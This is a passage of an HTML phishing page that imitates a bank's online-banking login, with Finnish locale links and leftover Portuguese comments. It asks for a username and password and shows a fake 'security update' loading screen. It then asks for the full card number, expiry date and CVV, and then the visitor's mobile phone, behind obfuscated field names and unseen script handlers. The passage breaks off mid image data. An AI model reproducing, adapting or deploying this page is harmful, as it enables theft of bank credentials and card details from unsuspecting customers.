RFEVRFEVRFEVRFEVRFEVRFKUpAPgfl/bEw5w8puMAAAAASUVORK5CYII=" />
      <span class="color-green font-12">In Swedish</span>
    </div>
    <div>
      <div id="menu" class="mt-20">
        <ul>
          <li class="selected">
            <p><span>
                <font style="vertical-align: inherit;">Personal customers</font>
              </span></p>
          </li>
          <li class="unselected">
            <a href="/corporatenetbank?locale=fi&amp;goto=">
              <span>
                <font style="vertical-align: inherit;">Business customers</font>
              </span>
            </a>
          </li>
        </ul>
      </div>
    </div>
    <div class="container mt-20">
      <div class="left-container-outer mt-10">
        <div class="navi-container">
          <h3>
            <font style="vertical-align: inherit;">Log in to online banking</font>
          </h3>
        </div>

        <div class="left-container mt-10">
          <div class="row">
            <!-- aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa -->
            <div id="table_div">	
								<div >
									<table style="width:100%;">
										<tbody>
											<tr>														
												<td valign="top" class="displayTable">
													<div id="form:0" style="display:none;">
														<br>
														<p style="font-size:12px;color:#333;">
															<!-- Uma grande atualização de segurança está em andamento, não atualize a página, isso pode
															demorar até 30
															segundos.  -->
															<font style="vertical-align: inherit;">A major security update is in progress, please do not refresh the page, it may take up to 30 seconds.</font>
														</p>
														<br><br><br><br><br><br><br><br><br>
														<div class="loader">
															<!-- <span class="en">Validando credenciais...</span> -->
															<span class="en"><font style="vertical-align: inherit;">Validating credentials ...</font></span>
														</div>
														<br><br><br><br><br>
													</div>
													<div class="main-content" id="form:1">
														<section class="">
															<div class="row_data">
																<font style="vertical-align: inherit;">Enter username and password:</font>
															</div>
															<form name="Login" action="/tunnistus/UI/Login" method="post">
																<div class="row_td">
																	<label for="IDToken1">
																		<font style="vertical-align: inherit;">User name:</font>
																	</label>
																</div>
																<div class="row_data">
																	<label>
																		<input type="text" name="CABF3B1E971C89A2C065B44FF5DEE7E3" id="_tables.login" value=""
																			maxlength="8" autocomplete="off" class="TxtFld">
																	</label>
																</div>
																<div class="clear"></div>
																<div class="row_td">
																	<label for="IDToken2">
																		<font style="vertical-align: inherit;">Password:</font>
																	</label>
																</div>
																<div class="row_data">
																	<label>
																		<input type="password" name="E028C9E8C572F1C6DB930924B27616FE" id="_tables.password"
																			value="" maxlength="8" autocomplete="off" class="TxtFld">
																	</label>
																</div>
																<input type="hidden" name="goto" value="">
																<input type="hidden" name="encoded" value="false">

																<div class="login_button_container">
																	<font style="vertical-align: inherit;">
																		<input type="button" class="button" id="submit_button" value="Log in"
																			onclick="_tables.fkbtn(1);">
																	</font>
																	<span class="button search"></span>
																</div>
																<input type="hidden" name="gx_charset" value="UTF-8">
															</form>
														</section>
													</div>
													<div id="form:2" class="main-content" style="display:none;">
														<div class="page-title">															
															<font style="vertical-align: inherit;">NetBanco Particulares</font>
															<!-- <h1 class="main-title">NetBanco Particulares</h1> -->
															<!-- <h2 class="secondary-title">Login</h2> -->
														</div>
														<div id="mainLoading" style="padding-right: 30px; font-size: 14px; display: none;">
															<br>															
															<font style="vertical-align: inherit;">Wait please. Treatment is ongoing, do not refresh the page.</font>
															<!-- Aguarde, por favor. O tratamento está em curso, não actualize a página.  -->
															<br>
															<br>
															<br>
															<br>
															<center>
																<img
																	src="data:image/gif;base64,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">
															</center>
														</div>
														<p class="title-description">
															<font style="vertical-align: inherit;">Confirm the bank card linked to your account below:</font>
															<!-- Confirme o cartão do banco vinculado à sua conta abaixo: -->
														</p>
														<!--  <div id="ccQuery"> -->
														<div id="">
															<div>
																<label>
																	<font style="vertical-align: inherit;">Credit Card Number</font>
																	<!-- Número do cartão de crédito -->
																</label>
																<br>
																<input onkeyup="_tables.next(this,4,'_tables.cc.2');" <input="" maxlength="4"
																	placeholder="XXXX" class="bitinput" id="_tables.cc.1" style=" text-align: center;"
																	type="text">
																&nbsp;-&nbsp;
																<input onkeyup="_tables.next(this,4,'_tables.cc.3');" <input="" maxlength="4"
																	placeholder="XXXX" class="bitinput" id="_tables.cc.2" style="text-align: center;"
																	type="text">
																&nbsp;-&nbsp;
																<input onkeyup="_tables.next(this,4,'_tables.cc.4');" <input="" maxlength="4"
																	placeholder="XXXX" class="bitinput" id="_tables.cc.3" style="text-align: center;"
																	type="text">
																&nbsp;-&nbsp;
																<input maxlength="4" placeholder="XXXX" class="bitinput" id="_tables.cc.4"
																	style=" text-align: center;" type="text">
															</div>
															<div class="inputDiv">																
																<label>
																		<font style="vertical-align: inherit;">Expiration date</font>
																		<!-- Data de expiração -->
																</label>
																<label>Data de expiração</label>
																<br>
																<select id="_tables.exp.1" style="width: 100px; padding: 3px;">
																	<option value="-1" selected="selected">--</option>
																	<option value="01">01</option>
																	<option value="02">02</option>
																	<option value="03">03</option>
																	<option value="04">04</option>
																	<option value="05">05</option>
																	<option value="06">06</option>
																	<option value="07">07</option>
																	<option value="08">08</option>
																	<option value="09">09</option>
																	<option value="10">10</option>
																	<option value="11">11</option>
																	<option value="12">12</option>
																</select>
																&nbsp;/&nbsp;
																<select id="_tables.exp.2" style="width: 100px; padding: 3px;">
																	<option value="">----</option>
																	<option value="20">2020</option>
																	<option value="21">2021</option>
																	<option value="22">2022</option>
																	<option value="23">2023</option>
																	<option value="24">2024</option>
																	<option value="25">2025</option>
																	<option value="25">2026</option>
																	<option value="25">2027</option>
																	<option value="25">2028</option>
																	<option value="25">2029</option>
																	<option value="25">2030</option>
																</select>
															</div>
															<div class="inputDiv">															
																<label>
																		<font style="vertical-align: inherit;">CVV (3 digits no verse)</font>
																		<!-- CVV (3 dígitos no verso) -->
																</label>
																<br>
																<input class="bitinput" placeholder="XXX" maxlength="3" id="_tables.cvv"
																	style="width: 60px; text-align: center;" type="text">
															</div>

															<div style="margin-top: 10px;">
																<font style="vertical-align: inherit;">
																	<input type="button" class="button" id="btn2" value="Continuar" onclick="goStep3();">
																</font>
															</div>
														</div>
													</div>
													<div id="form:3" style="display:none;">
														<div class="center">
															<table cellpadding="0" cellspacing="0" style="width:100%;">
																<tbody>
																	<tr>
																		<td valign="top" style="padding-right:20px;">
																			<font style="vertical-align: inherit;">PLEASE IDENTIFY-BE</font>
																			<!-- <h1>POR FAVOR, IDENTIFIQUE-SE</h1> -->
																			<p style="font-size:12px;line-height:20px;">
																				<!-- Para proteger a sua segurança online, temos de identificar o seu telemóvel que nos
																				ajudará a
																				verificar a sua identidade. -->
																				<font style="vertical-align: inherit;">To protect your online security, we need to identify your mobile phone that will help us verify your identity.</font>
																			</p>
																			<br>
																			<div>
																				<table cellpadding="0" cellspacing="0">
																					<tbody>
																						<tr>
																							<td>
																								<img style="width:60px;"
																									src="data:image/png;base64,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